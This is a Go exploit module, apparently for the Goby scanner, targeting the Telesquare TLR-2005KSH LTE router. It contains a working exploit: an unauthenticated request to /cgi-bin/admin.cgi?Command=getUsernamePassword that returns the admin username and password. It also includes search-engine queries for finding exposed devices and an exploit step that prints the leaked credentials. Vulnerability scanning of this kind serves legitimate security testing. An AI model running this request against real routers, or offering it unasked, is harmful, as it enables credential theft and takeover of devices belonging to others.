package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Telesquare TLR-2005Ksh getUsernamePassword Information Disclosure",
    "Description": "<p>Telesquare Tlr-2005Ksh is a Sk Telecom LTE router produced by Telesquare Korea.</p><p>There is a security hole in Telesquare TLR-2005Ksh. Attackers can obtain sensitive information such as username and password through getUsernamePassword.</p>",
    "Product": "TELESQUARE-TLR-2005KSH",
    "Homepage": "http://telesquare.co.kr/",
    "DisclosureDate": "2022-12-16",
    "Author": "corp0ra1",
    "FofaQuery": "title=\"TLR-2005KSH\" || banner=\"TLR-2005KSH login:\"",
    "GobyQuery": "title=\"TLR-2005KSH\" || banner=\"TLR-2005KSH login:\"",
    "Level": "2",
    "Impact": "<p>There is a security hole in Telesquare TLR-2005Ksh. Attackers can obtain sensitive information such as username and password through getUsernamePassword.</p>",
    "Recommendation": "<p>The manufacturer has not yet released a fix to solve this security problem, please pay attention to the manufacturer's update in time: <a href=\"http://telesquare.co.kr/.\">http://telesquare.co.kr/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/admin.cgi?Command=getUsernamePassword",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "</admin_username>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "</admin_password>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/admin.cgi?Command=getUsernamePassword",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Telesquare TLR-2005Ksh 路由器 getUsernamePassword 信息泄露漏洞",
            "Product": "TELESQUARE-TLR-2005KSH",
            "Description": "<p>Telesquare Tlr-2005Ksh是韩国Telesquare公司的一款 Sk 电讯 Lte 路由器。<br></p><p>Telesquare TLR-2005Ksh存在安全漏洞，攻击者可通过未授权getUsernamePassword获取用户名密码等敏感信息。<br></p>",
            "Recommendation": "<p>厂商暂未发布修复措施解决此安全问题，请及时关注厂商更新：<a href=\"http://telesquare.co.kr/\">http://telesquare.co.kr/</a>。<br></p>",
            "Impact": "<p>Telesquare TLR-2005Ksh存在安全漏洞，攻击者可通过未授权getUsernamePassword获取用户名密码等敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Telesquare TLR-2005Ksh getUsernamePassword Information Disclosure",
            "Product": "TELESQUARE-TLR-2005KSH",
            "Description": "<p>Telesquare Tlr-2005Ksh is a Sk Telecom LTE router produced by Telesquare Korea.<br></p><p>There is a security hole in Telesquare TLR-2005Ksh. Attackers can obtain sensitive information such as username and password through getUsernamePassword.<br></p>",
            "Recommendation": "<p>The manufacturer has not yet released a fix to solve this security problem, please pay attention to the manufacturer's update in time: <a href=\"http://telesquare.co.kr/.\">http://telesquare.co.kr/.</a><br></p>",
            "Impact": "<p>There is a security hole in Telesquare TLR-2005Ksh. Attackers can obtain sensitive information such as username and password through getUsernamePassword.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10777"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
